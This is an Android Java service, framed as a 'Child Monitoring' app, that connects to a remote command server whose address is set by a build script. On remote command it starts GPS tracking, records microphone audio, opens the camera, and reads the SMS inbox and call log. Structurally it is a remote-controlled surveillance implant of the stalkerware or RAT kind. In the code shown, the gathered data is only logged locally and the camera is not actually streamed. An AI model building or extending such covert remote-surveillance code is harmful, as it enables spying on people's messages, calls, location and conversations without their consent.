package com.xyz.child;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.database.Cursor;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import java.io.BufferedReader;
import java.io.File; // Added import
import java.io.InputStreamReader;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;

public class MonitoringService extends Service {
    private static final String CHANNEL_ID = "monitoring_channel";
    private static final String SERVER_HOST = "192.168.0.102"; // Will be replaced by build.py
    private static final int SERVER_PORT = 7100; // Will be replaced by build.py

    private MediaRecorder mediaRecorder;
    private File audioFile;
    private CameraDevice cameraDevice;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Child Monitoring")
                .setContentText("Monitoring is active")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        startForeground(1, notification);

        new Thread(() -> {
            try {
                Log.d("MonitoringService", "Attempting to connect to " + SERVER_HOST + ":" + SERVER_PORT);
                SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                SSLSocket socket = (SSLSocket) factory.createSocket(SERVER_HOST, SERVER_PORT);
                Log.d("MonitoringService", "Connected to server");
                BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String command;
                while ((command = in.readLine()) != null) {
                    Log.d("MonitoringService", "Received command: " + command);
                    handleCommand(command);
                }
                socket.close();
            } catch (Exception e) {
                Log.e("MonitoringService", "Connection error: " + e.getMessage(), e);
            }
        }).start();

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Monitoring Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private void handleCommand(String command) {
        switch (command) {
            case "start_location":
                startLocationTracking();
                break;
            case "start_audio":
                startAudioRecording();
                break;
            case "stop_audio":
                stopAudioRecording();
                break;
            case "start_camera":
                startCameraStreaming();
                break;
            case "read_sms":
                readSMS();
                break;
            case "read_call_log":
                readCallLog();
                break;
        }
    }

    private void startLocationTracking() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;

        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 10, new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location location) {
                Log.i("Location", "Lat: " + location.getLatitude() + ", Lng: " + location.getLongitude());
            }
        });
    }

    private void startAudioRecording() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return;
        try {
            File dir = new File(getExternalFilesDir(null), "recordings");
            if (!dir.exists()) dir.mkdirs();
            audioFile = new File(dir, "audio_record.3gp");

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mediaRecorder.prepare();
            mediaRecorder.start();
            Log.i("Audio", "Recording started");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void stopAudioRecording() {
        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
                Log.i("Audio", "Recording stopped");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startCameraStreaming() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return;

        CameraManager manager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String cameraId = manager.getCameraIdList()[0];
            manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    Log.i("Camera", "Camera opened");
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                }
            }, null);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    private void readSMS() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;

        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                Log.i("SMS", "From: " + address + " Message: " + body);
            }
            cursor.close();
        }
    }

    private void readCallLog() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;

        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                Log.i("CallLog", "Number: " + number + ", Type: " + type + ", Duration: " + duration);
            }
            cursor.close();
        }
    }
}
